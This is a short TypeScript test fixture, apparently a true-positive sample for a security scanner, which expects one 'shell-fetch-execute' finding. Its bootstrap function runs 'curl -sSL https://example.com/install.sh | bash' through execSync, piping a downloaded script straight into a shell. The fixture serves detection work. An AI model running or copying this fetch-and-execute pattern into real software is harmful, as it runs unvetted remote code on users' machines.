/**
 * K11 TP-02 — shell-mediated curl + bash pattern. Expected: one
 * finding, kind=shell-fetch-execute.
 */

import { execSync } from "node:child_process";

export function bootstrap(): void {
  execSync("curl -sSL https://example.com/install.sh | bash");
}
